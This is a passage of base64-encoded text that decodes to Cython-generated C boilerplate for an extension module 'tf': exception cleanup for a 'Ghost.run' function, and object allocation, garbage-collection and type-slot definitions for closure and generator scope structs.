AgICAgewogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICBnb3RvIF9fcHl4X0wxNTsKICAgICAgICB9CiAgICAgICAgX19weXhfTDE0X2Vycm9yOjsKICAgICAgICB7CiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgICBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTcgPSAwOyBfX3B5eF90XzE4ID0gMDsgX19weXhfdF8xOSA9IDA7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblN3YXAoJl9fcHl4X3RfMTgsICZfX3B5eF90XzE5LCAmX19weXhfdF8yMCk7CiAgICAgICAgICBpZiAoIHVubGlrZWx5KF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF8xNSwgJl9fcHl4X3RfMTYsICZfX3B5eF90XzE3KSA8IDApKSBfX1B5eF9FcnJGZXRjaCgmX19weXhfdF8xNSwgJl9fcHl4X3RfMTYsICZfX3B5eF90XzE3KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOCk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIwKTsKICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX3B5eF9saW5lbm87IF9fcHl4X3RfMTMgPSBfX3B5eF9jbGluZW5vOyBfX3B5eF90XzE0ID0gX19weXhfZmlsZW5hbWU7CiAgICAgICAgICB7CiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF92X2UpOyBfX3B5eF92X2UgPSAwOwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xOCk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE5KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMjApOwogICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xOCwgX19weXhfdF8xOSwgX19weXhfdF8yMCk7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE1KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTYpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNyk7CiAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlKF9fcHl4X3RfMTUsIF9fcHl4X3RfMTYsIF9fcHl4X3RfMTcpOwogICAgICAgICAgX19weXhfdF8xNSA9IDA7IF9fcHl4X3RfMTYgPSAwOyBfX3B5eF90XzE3ID0gMDsgX19weXhfdF8xOCA9IDA7IF9fcHl4X3RfMTkgPSAwOyBfX3B5eF90XzIwID0gMDsKICAgICAgICAgIF9fcHl4X2xpbmVubyA9IF9fcHl4X3RfMTI7IF9fcHl4X2NsaW5lbm8gPSBfX3B5eF90XzEzOyBfX3B5eF9maWxlbmFtZSA9IF9fcHl4X3RfMTQ7CiAgICAgICAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjsKICAgICAgICB9CiAgICAgICAgX19weXhfTDE1OjsKICAgICAgfQogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQogICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CgogICAgCiAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMSk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzksIF9fcHl4X3RfMTAsIF9fcHl4X3RfMTEpOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEwKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF85LCBfX3B5eF90XzEwLCBfX3B5eF90XzExKTsKICAgIF9fcHl4X0w4X3RyeV9lbmQ6OwogIH0KCiAgCgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5ydW4iLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2UpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF90cF9uZXdfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKFB5VHlwZU9iamVjdCAqdCwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqYSwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqaykgewogIFB5T2JqZWN0ICpvOwogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgYWxsb2NmdW5jIGFsbG9jX2Z1bmMgPSAoYWxsb2NmdW5jKVB5VHlwZV9HZXRTbG90KHQsIFB5X3RwX2FsbG9jKTsKICBvID0gYWxsb2NfZnVuYyh0LCAwKTsKICAjZWxzZQogICNpZiBDWVRIT05fVVNFX0ZSRUVMSVNUUwogIGlmIChsaWtlbHkoKGludCkoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCA+IDApICYgKGludCkodC0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCkpKSkgewogICAgbyA9IChQeU9iamVjdCopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWxpc3RfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsWy0tX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbF07CiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKSk7CiAgICAodm9pZCkgUHlPYmplY3RfSU5JVChvLCB0KTsKICAgIFB5T2JqZWN0X0dDX1RyYWNrKG8pOwogIH0gZWxzZQogICNlbmRpZgogIHsKICAgIG8gPSAoKnQtPnRwX2FsbG9jKSh0LCAwKTsKICAgIGlmICh1bmxpa2VseSghbykpIHJldHVybiAwOwogIH0KICAjZW5kaWYKICByZXR1cm4gbzsKfQoKc3RhdGljIHZvaWQgX19weXhfdHBfZGVhbGxvY18ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwoUHlPYmplY3QgKm8pIHsKICBzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCAqKW87CiAgI2lmIENZVEhPTl9VU0VfVFBfRklOQUxJWkUKICBpZiAodW5saWtlbHkoKFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwMDAgfHwgX19QeXhfUHlUeXBlX0hhc0ZlYXR1cmUoUHlfVFlQRShvKSwgUHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFKSkgJiYgX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9maW5hbGl6ZSwgZGVzdHJ1Y3RvcikpICYmICFfX1B5eF9QeU9iamVjdF9HQ19Jc0ZpbmFsaXplZChvKSkgewogICAgaWYgKF9fUHl4X1B5T2JqZWN0X0dldFNsb3QobywgdHBfZGVhbGxvYywgZGVzdHJ1Y3RvcikgPT0gX19weXhfdHBfZGVhbGxvY18ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwpIHsKICAgICAgaWYgKFB5T2JqZWN0X0NhbGxGaW5hbGl6ZXJGcm9tRGVhbGxvYyhvKSkgcmV0dXJuOwogICAgfQogIH0KICAjZW5kaWYKICBQeU9iamVjdF9HQ19VblRyYWNrKG8pOwogIFB5X0NMRUFSKHAtPl9fcHl4X3Zfc2VsZik7CiAgI2lmIENZVEhPTl9VU0VfRlJFRUxJU1RTCiAgaWYgKCgoaW50KShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsIDwgOCkgJiAoaW50KShQeV9UWVBFKG8pLT50cF9iYXNpY3NpemUgPT0gc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKSkpKSB7CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGxbX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZnJlZWNvdW50XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCsrXSA9ICgoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwgKilvKTsKICB9IGVsc2UKICAjZW5kaWYKICB7CiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAoKlB5X1RZUEUobyktPnRwX2ZyZWUpKG8pOwogICAgI2Vsc2UKICAgIHsKICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdChQeV9UWVBFKG8pLCBQeV90cF9mcmVlKTsKICAgICAgaWYgKHRwX2ZyZWUpIHRwX2ZyZWUobyk7CiAgICB9CiAgICAjZW5kaWYKICB9Cn0KCnN0YXRpYyBpbnQgX19weXhfdHBfdHJhdmVyc2VfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsKFB5T2JqZWN0ICpvLCB2aXNpdHByb2Mgdiwgdm9pZCAqYSkgewogIGludCBlOwogIHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICpwID0gKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsICopbzsKICB7CiAgICBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKG8sIDEsIHYsIGEpOwogICAgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfdl9zZWxmKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF92X3NlbGYsIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIHJldHVybiAwOwp9CgpzdGF0aWMgaW50IF9fcHl4X3RwX2NsZWFyXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbChQeU9iamVjdCAqbykgewogIFB5T2JqZWN0KiB0bXA7CiAgc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwgKnAgPSAoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwgKilvOwogIHRtcCA9ICgoUHlPYmplY3QqKXAtPl9fcHl4X3Zfc2VsZik7CiAgcC0+X19weXhfdl9zZWxmID0gUHlfTm9uZTsgUHlfSU5DUkVGKFB5X05vbmUpOwogIFB5X1hERUNSRUYodG1wKTsKICByZXR1cm4gMDsKfQojaWYgQ1lUSE9OX1VTRV9UWVBFX1NQRUNTCnN0YXRpYyBQeVR5cGVfU2xvdCBfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbF9zbG90c1tdID0gewogIHtQeV90cF9kZWFsbG9jLCAodm9pZCAqKV9fcHl4X3RwX2RlYWxsb2NfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsfSwKICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsfSwKICB7UHlfdHBfY2xlYXIsICh2b2lkICopX19weXhfdHBfY2xlYXJfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsfSwKICB7UHlfdHBfbmV3LCAodm9pZCAqKV9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGx9LAogIHswLCAwfSwKfTsKc3RhdGljIFB5VHlwZV9TcGVjIF9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsX3NwZWMgPSB7CiAgInRmLl9fcHl4X3Njb3BlX3N0cnVjdF9fdGxsIiwKICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwpLAogIDAsCiAgUHlfVFBGTEFHU19ERUZBVUxUfFB5X1RQRkxBR1NfSEFWRV9WRVJTSU9OX1RBR3xQeV9UUEZMQUdTX0NIRUNLVFlQRVN8UHlfVFBGTEFHU19IQVZFX05FV0JVRkZFUnxQeV9UUEZMQUdTX0hBVkVfR0N8UHlfVFBGTEFHU19IQVZFX0ZJTkFMSVpFLAogIF9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsX3Nsb3RzLAp9OwojZWxzZQoKc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCA9IHsKICBQeVZhck9iamVjdF9IRUFEX0lOSVQoMCwgMCkKICAidGYuIiJfX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCIsIAogIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCksIAogIDAsIAogIF9fcHl4X3RwX2RlYWxsb2NfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsLCAKICAjaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDgwMGI0CiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICBQeV9UUEZMQUdTX0RFRkFVTFR8UHlfVFBGTEFHU19IQVZFX1ZFUlNJT05fVEFHfFB5X1RQRkxBR1NfQ0hFQ0tUWVBFU3xQeV9UUEZMQUdTX0hBVkVfTkVXQlVGRkVSfFB5X1RQRkxBR1NfSEFWRV9HQ3xQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUsIAogIDAsIAogIF9fcHl4X3RwX3RyYXZlcnNlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCwgCiAgX19weXhfdHBfY2xlYXJfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF9fdGxsLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAwLCAKICAjaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUwogIDAsIAogICNlbmRpZgogIDAsIAogIDAsIAogIF9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0X190bGwsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogICNpZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFCiAgMCwgCiAgI2Vsc2UKICBOVUxMLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiMSAmJiAoIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSB8fCBQWVBZX1ZFUlNJT05fTlVNID49IDB4MDcwMzA4MDApCiAgMCwgCiAgI2VuZGlmCiAgI2lmIF9fUFlYX05FRURfVFBfUFJJTlRfU0xPVCA9PSAxCiAgMCwgCiAgI2VuZGlmCiAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDBBNAogIDAsIAogICNlbmRpZgogICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDAwMCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwYTAwMDAKICAwLCAKICAjZW5kaWYKfTsKI2VuZGlmCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3RwX25ld18ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcihQeVR5cGVPYmplY3QgKnQsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmEsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmspIHsKICBQeU9iamVjdCAqbzsKICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogIGFsbG9jZnVuYyBhbGxvY19mdW5jID0gKGFsbG9jZnVuYylQeVR5cGVfR2V0U2xvdCh0LCBQeV90cF9hbGxvYyk7CiAgbyA9IGFsbG9jX2Z1bmModCwgMCk7CiAgI2Vsc2UKICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKICBpZiAobGlrZWx5KChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA+IDApICYgKGludCkodC0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSkpKSB7CiAgICBvID0gKFB5T2JqZWN0KilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwclstLV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcl07CiAgICBtZW1zZXQobywgMCwgc2l6ZW9mKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpKTsKICAgICh2b2lkKSBQeU9iamVjdF9JTklUKG8sIHQpOwogICAgUHlPYmplY3RfR0NfVHJhY2sobyk7CiAgfSBlbHNlCiAgI2VuZGlmCiAgewogICAgbyA9ICgqdC0+dHBfYWxsb2MpKHQsIDApOwogICAgaWYgKHVubGlrZWx5KCFvKSkgcmV0dXJuIDA7CiAgfQogICNlbmRpZgogIHJldHVybiBvOwp9CgpzdGF0aWMgdm9pZCBfX3B5eF90cF9kZWFsbG9jXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKFB5T2JqZWN0ICpvKSB7CiAgc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopbzsKICAjaWYgQ1lUSE9OX1VTRV9UUF9GSU5BTElaRQogIGlmICh1bmxpa2VseSgoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDAwMCB8fCBfX1B5eF9QeVR5cGVfSGFzRmVhdHVyZShQeV9UWVBFKG8pLCBQeV9UUEZMQUdTX0hBVkVfRklOQUxJWkUpKSAmJiBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2ZpbmFsaXplLCBkZXN0cnVjdG9yKSkgJiYgIV9fUHl4X1B5T2JqZWN0X0dDX0lzRmluYWxpemVkKG8pKSB7CiAgICBpZiAoX19QeXhfUHlPYmplY3RfR2V0U2xvdChvLCB0cF9kZWFsbG9jLCBkZXN0cnVjdG9yKSA9PSBfX3B5eF90cF9kZWFsbG9jXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSB7CiAgICAgIGlmIChQeU9iamVjdF9DYWxsRmluYWxpemVyRnJvbURlYWxsb2MobykpIHJldHVybjsKICAgIH0KICB9CiAgI2VuZGlmCiAgUHlPYmplY3RfR0NfVW5UcmFjayhvKTsKICBQeV9DTEVBUihwLT5fX3B5eF9vdXRlcl9zY29wZSk7CiAgUHlfQ0xFQVIocC0+X19weXhfZ2VuZXhwcl9hcmdfMCk7CiAgUHlfQ0xFQVIocC0+X19weXhfdl9pKTsKICAjaWYgQ1lUSE9OX1VTRV9GUkVFTElTVFMKICBpZiAoKChpbnQpKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ZyZWVjb3VudF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciA8IDgpICYgKGludCkoUHlfVFlQRShvKS0+dHBfYmFzaWNzaXplID09IHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSkpKSB7CiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlbGlzdF8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcltfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9mcmVlY291bnRfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIrK10gPSAoKHN0cnVjdCBfX3B5eF9vYmpfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIgKilvKTsKICB9IGVsc2UKICAjZW5kaWYKICB7CiAgICAjaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiAgICAoKlB5X1RZUEUobyktPnRwX2ZyZWUpKG8pOwogICAgI2Vsc2UKICAgIHsKICAgICAgZnJlZWZ1bmMgdHBfZnJlZSA9IChmcmVlZnVuYylQeVR5cGVfR2V0U2xvdChQeV9UWVBFKG8pLCBQeV90cF9mcmVlKTsKICAgICAgaWYgKHRwX2ZyZWUpIHRwX2ZyZWUobyk7CiAgICB9CiAgICAjZW5kaWYKICB9Cn0KCnN0YXRpYyBpbnQgX19weXhfdHBfdHJhdmVyc2VfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIoUHlPYmplY3QgKm8sIHZpc2l0cHJvYyB2LCB2b2lkICphKSB7CiAgaW50IGU7CiAgc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqcCA9IChzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByICopbzsKICB7CiAgICBlID0gX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKG8sIDEsIHYsIGEpOwogICAgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfb3V0ZXJfc2NvcGUpIHsKICAgIGUgPSAoKnYpKCgoUHlPYmplY3QgKilwLT5fX3B5eF9vdXRlcl9zY29wZSksIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIGlmIChwLT5fX3B5eF9nZW5leHByX2FyZ18wKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF9nZW5leHByX2FyZ18wLCBhKTsgaWYgKGUpIHJldHVybiBlOwogIH0KICBpZiAocC0+X19weXhfdl9pKSB7CiAgICBlID0gKCp2KShwLT5fX3B5eF92X2ksIGEpOyBpZiAoZSkgcmV0dXJuIGU7CiAgfQogIHJldHVybiAwOwp9CiNpZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X3R5cGVfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJfc2xvdHNbXSA9IHsKICB7UHlfdHBfZGVhbGxvYywgKHZvaWQgKilfX3B5eF90cF9kZWFsbG9jXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByfSwKICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19weXhfdHBfdHJhdmVyc2VfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHJ9LAogIHtQeV90cF9uZXcsICh2b2lkICopX19weXhfdHBfbmV3XzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByfSwKICB7MCwgMH0sCn07CnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3NwZWMgPSB7CiAgInRmLl9fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIiLAogIHNpemVvZihzdHJ1Y3QgX19weXhfb2JqXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKSwKICAwLAogIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwKICBfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByX3Nsb3RzLAp9OwojZWxzZQoKc3RhdGljIFB5VHlwZU9iamVjdCBfX3B5eF90eXBlXzJ0Zl9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByID0gewogIFB5VmFyT2JqZWN0X0hFQURfSU5JVCgwLCAwKQogICJ0Zi4iIl9fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIiLCAKICBzaXplb2Yoc3RydWN0IF9fcHl4X29ial8ydGZfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciksIAogIDAsIAogIF9fcHl4X3RwX2RlYWxsb2NfMnRmX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIsIAogICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwYjQKICAwLCAKICAjZW5kaWYKICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNAogIDAsIAogICNlbmRpZgogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIDAsIAogIFB5X1RQRkxBR1NfREVGQVVMVHxQeV9UUEZMQUdTX0hBVkVfVkVSU0lPTl9UQUd8UHlfVFBGTEFHU19DSEVDS1RZUEVTfFB5X1RQRkxBR1NfSEFWRV9ORVdCVUZGRVJ8UHlfVFBGTEFHU19IQVZFX0dDfFB5X1RQRkxBR1NfSEFWRV9GSU5BTElaRSwgCiAgMCwgCiAgX19weXhfdHBfdHJhdmVyc2VfMnRmX19fcHl4